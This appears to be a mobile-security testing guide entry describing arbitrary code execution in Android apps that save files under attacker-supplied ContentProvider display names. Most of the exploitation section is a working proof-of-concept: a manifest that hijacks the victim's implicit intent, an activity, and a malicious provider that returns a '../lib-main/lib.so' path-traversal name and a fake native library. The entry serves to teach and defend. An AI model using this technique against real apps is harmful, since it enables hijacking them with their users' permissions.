---
masvs_category: MASVS-CODE
platform: android
title: Arbitrary Code Execution via Implicit Intent Results
---

Improperly handling the return value of an implicit intent can lead to Arbitrary Code Execution if a victim app accepts `content://` URIs and uses the filename provided by the `ContentProvider` without sanitization.

### Vulnerability Mechanism

If a victim app requests a file via a custom implicit intent (e.g., `com.victim.app.ACTION_ATTACH_FILE`), an attacker can intercept the request and return a `content://` URI managed by the attacker's own `ContentProvider`. When the victim app queries this provider to get the display name (filename) for the content, the attacker can return a path-traversal string, such as `../lib/native.so`.

If the victim app then uses this unvalidated filename to save the content within its own internal storage, it can overwrite its own critical files. If the overwritten file is an executable library that the app later dynamically loads, the attacker's code will execute with the victim app's permissions.

### Exploitation (Attacker Application)

The attacker implements a malicious `ContentProvider` that returns the path-traversal filename and a malicious payload.

#### Attacker Manifest
```xml
<application>
  <activity android:name=".EvilContentActivity" android:exported="true">
      <intent-filter android:priority="999">
          <action android:name="com.victim.app.ACTION_ATTACH_FILE" />
          <category android:name="android.intent.category.DEFAULT" />
      </intent-filter>
  </activity>
  <!-- Exported malicious provider -->
  <provider 
      android:name=".EvilContentProvider" 
      android:authorities="com.attacker.evil" 
      android:enabled="true" 
      android:exported="true">
  </provider>
</application>
```

#### Attacker Activity
The attacker activity returns the `content://` URI pointing to their malicious provider.

```java
public class EvilContentActivity extends Activity {
  @Override
  protected void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    Intent resultIntent = new Intent();
    resultIntent.setData(Uri.parse("content://com.attacker.evil/fakelib.so"));
    setResult(Activity.RESULT_OK, resultIntent);
    finish();
  }
}
```

#### Malicious ContentProvider
When the victim queries the provider for the file's name, the attacker returns the path-traversal string. When the victim requests the file descriptor, the attacker serves the malicious `.so` payload.

```java
public class EvilContentProvider extends ContentProvider {
    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        // Return a path-traversal filename designed to overwrite a library
        MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
        matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
        return matrixCursor;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        // Return the malicious library payload
        File fakeLib = new File("/data/data/com.attacker/fakelib.so");
        return ParcelFileDescriptor.open(fakeLib, ParcelFileDescriptor.MODE_READ_ONLY);
    }
    
    // ... other required ContentProvider methods ...
}
```

If the victim app fails to sanitize the `_display_name` returned by the query, it will save `fakelib.so` over its legitimate `lib.so` in `../lib-main/`, resulting in arbitrary code execution the next time the library is loaded.
